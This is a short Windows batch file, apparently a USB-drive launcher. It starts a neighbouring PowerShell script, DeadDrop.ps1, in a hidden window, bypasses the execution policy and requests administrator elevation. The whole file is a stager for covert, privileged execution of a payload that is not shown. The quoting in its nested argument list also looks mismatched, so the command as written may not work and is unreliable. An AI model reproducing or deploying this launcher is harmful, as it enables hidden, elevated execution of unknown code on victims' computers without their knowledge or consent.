@echo off
setlocal

:: Get the current directory (USB drive directory)
set "SCRIPT_DIR=%~dp0"

:: Full path to PowerShell script
set "PS_SCRIPT=%SCRIPT_DIR%DeadDrop.ps1"

:: Launch PowerShell hidden with admin rights and execution policy bypass
powershell -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden ^
  -Command "Start-Process PowerShell -ArgumentList '-NoProfile','-ExecutionPolicy','Bypass','-WindowStyle','Hidden','-File','\"%PS_SCRIPT%\"'' -Verb RunAs"

endlocal
exit
